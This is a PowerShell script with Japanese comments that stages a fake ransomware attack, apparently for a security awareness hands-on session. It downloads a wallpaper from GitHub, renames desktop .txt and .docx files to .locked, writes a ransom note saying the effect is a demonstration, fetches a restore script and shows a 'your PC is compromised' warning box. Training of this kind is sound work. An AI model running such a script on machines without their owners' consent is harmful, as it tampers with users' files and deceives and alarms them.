# FakeRansom_JP_GitHubWall.ps1 (修正版・最終)

# 設定
$url = "https://raw.githubusercontent.com/cyberattackerdemo/main/main/yourpcishacked.jpg"
$imgPath = "$env:PUBLIC\yourpcishacked.jpg"
$desktop = [Environment]::GetFolderPath("Desktop")

# ▼ 警告ファイル内容
$warning = @"
※今回はハンズオン用の演出のため、拡張子を元に戻せば問題なくファイルは元通りになります。
実際にはこのようなテキストファイルに身代金の支払い方法と締め切り日などが記載されます。

【復旧方法】
元に戻したい場合は、デスクトップに置いた
「RestoreRansomEffects.ps1」を右クリックし、
「PowerShellで実行」を選択してください。
"@

try {
    # GitHubから画像ダウンロード
    Invoke-WebRequest -Uri $url -OutFile $imgPath -UseBasicParsing

    # 壁紙変更
    $code = @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    Add-Type $code
    [Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)

} catch {
    Write-Host "壁紙変更または画像ダウンロードでエラー: $($_.Exception.Message)"
}

try {
    # .txt, .docx ファイルを .locked にリネーム（デスクトップ直下のみ）
    Get-ChildItem -Path $desktop -Include *.txt, *.docx -File | ForEach-Object {
        $newName = "$($_.BaseName).locked"
        Rename-Item -Path $_.FullName -NewName $newName -Force
    }
} catch {
    Write-Host "ファイルリネームでエラー: $($_.Exception.Message)"
}

try {
    # ランサムノート作成（UTF-8 BOMで文字化け防止）
    $notePath = Join-Path $desktop "README_復元したい人用.txt"
    $warning | Out-File -FilePath $notePath -Encoding utf8 -Force
} catch {
    Write-Host "ランサムノート生成でエラー: $($_.Exception.Message)"
}

try {
    # 復旧用スクリプトをGitHubからデスクトップへダウンロード
    $restoreUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/RestoreRansomEffects.ps1"
    $restorePath = Join-Path $desktop "RestoreRansomEffects.ps1"
    Invoke-WebRequest -Uri $restoreUrl -OutFile $restorePath -UseBasicParsing
} catch {
    # ダウンロード失敗時はランサムノートに追記
    Add-Content -Path $notePath -Value "`n※復旧スクリプトのダウンロードに失敗しました。手動でGitHubから取得してください。"
}

try {
    # ダイアログ表示
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show(
        "あなたのPCは侵害されました！復号キーが必要です。元に戻したい場合はDesktopのテキストファイルを確認してください。",
        "警告",
        0,
        'Warning'
    )
} catch {
    Write-Host "メッセージボックス表示でエラー: $($_.Exception.Message)"
}

Write-Host "FakeRansom_JP_GitHubWall.ps1 完了"
